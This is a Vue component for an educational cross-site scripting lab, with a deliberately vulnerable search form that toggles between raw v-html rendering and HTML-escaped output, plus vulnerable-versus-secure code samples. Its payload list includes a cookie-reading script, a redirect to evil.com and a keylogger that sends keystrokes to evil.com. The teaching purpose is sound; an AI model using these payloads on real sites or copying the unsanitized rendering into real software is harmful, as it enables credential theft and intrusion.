<template>
  <div class="attack-lab-view">
    <div class="page-header">
      <h1>{{ t.attackLab.title }}</h1>
      <p>{{ t.attackLab.subtitle }}</p>
    </div>

    <Card class="warning-card">
      <template #content>
        <div class="warning-banner">
          <i class="pi pi-exclamation-triangle"></i>
          <span>{{ t.attackLab.warning }}</span>
        </div>
      </template>
    </Card>

    <div class="lab-layout">
      <Card class="attack-panel">
        <template #content>
          <h3>{{ t.attackLab.selectAttack }}</h3>
          <div class="attack-types">
            <div v-for="(attack, key) in t.attackLab.attackTypes" :key="key"
                 class="attack-type" :class="{ active: selectedAttack === key }"
                 @click="selectedAttack = key">
              <div class="attack-icon">
                <i :class="getAttackIcon(key)"></i>
              </div>
              <div class="attack-info">
                <h4>{{ attack.name }}</h4>
                <p>{{ attack.desc }}</p>
              </div>
            </div>
          </div>

          <div class="payload-section">
            <label>{{ t.attackLab.payload }}</label>
            <Textarea v-model="payload" :placeholder="t.attackLab.payloadPlaceholder" rows="3" class="payload-input" />
          </div>

          <div class="examples-section">
            <h4>{{ t.attackLab.examples.title }}</h4>
            <div class="example-buttons">
              <Button :label="t.attackLab.examples.basic" size="small" severity="secondary" outlined @click="setPayload('basic')" />
              <Button :label="t.attackLab.examples.cookie" size="small" severity="secondary" outlined @click="setPayload('cookie')" />
              <Button :label="t.attackLab.examples.redirect" size="small" severity="secondary" outlined @click="setPayload('redirect')" />
              <Button :label="t.attackLab.examples.keylogger" size="small" severity="secondary" outlined @click="setPayload('keylogger')" />
            </div>
          </div>

          <Button :label="t.attackLab.executeAttack" icon="pi pi-bolt" severity="danger" @click="executeAttack" class="execute-btn" />
        </template>
      </Card>

      <Card class="target-panel">
        <template #content>
          <h3>{{ t.attackLab.targetInput }}</h3>
          <div class="vulnerable-form">
            <label>Search:</label>
            <InputText v-model="userInput" :placeholder="t.attackLab.targetPlaceholder" class="vulnerable-input" />
            <Button label="Submit" icon="pi pi-search" @click="submitInput" />
          </div>

          <div class="result-section" v-if="showResult">
            <h4>{{ t.attackLab.result }}</h4>
            <div class="result-box" :class="{ success: attackSuccess, blocked: !attackSuccess }">
              <i :class="attackSuccess ? 'pi pi-check-circle' : 'pi pi-times-circle'"></i>
              <span>{{ attackSuccess ? t.attackLab.success : t.attackLab.blocked }}</span>
            </div>
          </div>

          <div class="preview-section">
            <h4>{{ t.attackLab.resultPreview }}</h4>
            <div class="preview-box">
              <div v-if="defenseEnabled" class="sanitized-output">{{ sanitizedOutput }}</div>
              <div v-else v-html="rawOutput" class="raw-output"></div>
            </div>
          </div>

          <div class="defense-toggle">
            <ToggleSwitch v-model="defenseEnabled" />
            <span>Defense: {{ defenseEnabled ? 'ON' : 'OFF' }}</span>
          </div>
        </template>
      </Card>
    </div>

    <Card class="code-panel">
      <template #content>
        <h3><i class="pi pi-code"></i> Vulnerable vs Secure Code</h3>
        <TabView>
          <TabPanel header="Vulnerable">
            <pre class="code-block vulnerable-code">// VULNERABLE CODE - Never do this!
function displaySearch(userInput) {
  document.getElementById('results').innerHTML =
    'You searched for: ' + userInput;
}

// The input is directly inserted without sanitization
// Allows XSS payloads to execute</pre>
          </TabPanel>
          <TabPanel header="Secure">
            <pre class="code-block secure-code">// SECURE CODE - Always sanitize!
function displaySearch(userInput) {
  const sanitized = escapeHtml(userInput);
  document.getElementById('results').textContent =
    'You searched for: ' + sanitized;
}

function escapeHtml(text) {
  const map = {
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}</pre>
          </TabPanel>
        </TabView>
      </template>
    </Card>
  </div>
</template>

<script>
import { ref, computed } from 'vue'

export default {
  props: { t: Object, language: String },
  setup() {
    const selectedAttack = ref('reflected')
    const payload = ref('')
    const userInput = ref('')
    const showResult = ref(false)
    const attackSuccess = ref(false)
    const defenseEnabled = ref(false)

    const payloads = {
      basic: '<script>alert("XSS")<\/script>',
      cookie: '<script>alert(document.cookie)<\/script>',
      redirect: '<script>location="http://evil.com"<\/script>',
      keylogger: '<script>document.onkeypress=function(e){new Image().src="http://evil.com/log?k="+e.key}<\/script>'
    }

    const setPayload = (type) => {
      payload.value = payloads[type]
    }

    const escapeHtml = (text) => {
      const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' }
      return text.replace(/[&<>"']/g, m => map[m])
    }

    const rawOutput = computed(() => {
      return userInput.value || payload.value
    })

    const sanitizedOutput = computed(() => {
      return escapeHtml(userInput.value || payload.value)
    })

    const executeAttack = () => {
      userInput.value = payload.value
      showResult.value = true
      attackSuccess.value = !defenseEnabled.value && payload.value.includes('<script')
    }

    const submitInput = () => {
      showResult.value = true
      attackSuccess.value = !defenseEnabled.value && userInput.value.includes('<script')
    }

    const getAttackIcon = (key) => {
      const icons = {
        reflected: 'pi pi-replay',
        stored: 'pi pi-database',
        dom: 'pi pi-sitemap'
      }
      return icons[key] || 'pi pi-bolt'
    }

    return {
      selectedAttack,
      payload,
      userInput,
      showResult,
      attackSuccess,
      defenseEnabled,
      rawOutput,
      sanitizedOutput,
      setPayload,
      executeAttack,
      submitInput,
      getAttackIcon
    }
  }
}
</script>

<style scoped>
.attack-lab-view {
  max-width: 1200px;
  margin: 0 auto;
}

.page-header {
  text-align: center;
  margin-bottom: 1.5rem;
}

.warning-card {
  margin-bottom: 1.5rem;
  background: rgba(239, 68, 68, 0.1);
  border: 1px solid #ef4444;
}

.warning-banner {
  display: flex;
  align-items: center;
  gap: 1rem;
  color: #ef4444;
  font-weight: 500;
}

.warning-banner i {
  font-size: 1.5rem;
}

.lab-layout {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 1.5rem;
  margin-bottom: 1.5rem;
}

.attack-panel h3,
.target-panel h3 {
  margin-bottom: 1rem;
}

.attack-types {
  display: flex;
  flex-direction: column;
  gap: 0.75rem;
  margin-bottom: 1.5rem;
}

.attack-type {
  display: flex;
  align-items: center;
  gap: 1rem;
  padding: 1rem;
  background: var(--bg-primary);
  border-radius: 8px;
  cursor: pointer;
  border: 2px solid transparent;
  transition: all 0.2s;
}

.attack-type:hover {
  border-color: #f97316;
}

.attack-type.active {
  border-color: #f97316;
  background: rgba(249, 115, 22, 0.1);
}

.attack-icon {
  width: 40px;
  height: 40px;
  background: #ef4444;
  border-radius: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.attack-icon i {
  color: white;
}

.attack-info h4 {
  margin-bottom: 0.25rem;
}

.attack-info p {
  font-size: 0.85rem;
  color: var(--text-secondary);
}

.payload-section {
  margin-bottom: 1rem;
}

.payload-section label {
  display: block;
  margin-bottom: 0.5rem;
  font-weight: 500;
}

.payload-input {
  width: 100%;
  font-family: monospace;
}

.examples-section h4 {
  margin-bottom: 0.5rem;
}

.example-buttons {
  display: flex;
  flex-wrap: wrap;
  gap: 0.5rem;
  margin-bottom: 1rem;
}

.execute-btn {
  width: 100%;
}

.vulnerable-form {
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
  margin-bottom: 1.5rem;
}

.vulnerable-input {
  width: 100%;
}

.result-section {
  margin-bottom: 1rem;
}

.result-box {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  padding: 1rem;
  border-radius: 8px;
}

.result-box.success {
  background: rgba(239, 68, 68, 0.1);
  color: #ef4444;
}

.result-box.blocked {
  background: rgba(34, 197, 94, 0.1);
  color: #22c55e;
}

.result-box i {
  font-size: 1.25rem;
}

.preview-section h4 {
  margin-bottom: 0.5rem;
}

.preview-box {
  background: var(--bg-primary);
  padding: 1rem;
  border-radius: 8px;
  min-height: 80px;
  border: 1px dashed var(--border-color);
}

.defense-toggle {
  display: flex;
  align-items: center;
  gap: 0.75rem;
  margin-top: 1rem;
  padding: 1rem;
  background: var(--bg-primary);
  border-radius: 8px;
}

.code-panel h3 {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  margin-bottom: 1rem;
}

.code-panel h3 i {
  color: #f97316;
}

.code-block {
  font-family: 'Courier New', monospace;
  font-size: 0.85rem;
  padding: 1rem;
  border-radius: 8px;
  overflow-x: auto;
  white-space: pre;
}

.vulnerable-code {
  background: rgba(239, 68, 68, 0.1);
  border: 1px solid #ef4444;
}

.secure-code {
  background: rgba(34, 197, 94, 0.1);
  border: 1px solid #22c55e;
}

@media (max-width: 768px) {
  .lab-layout {
    grid-template-columns: 1fr;
  }
}
</style>
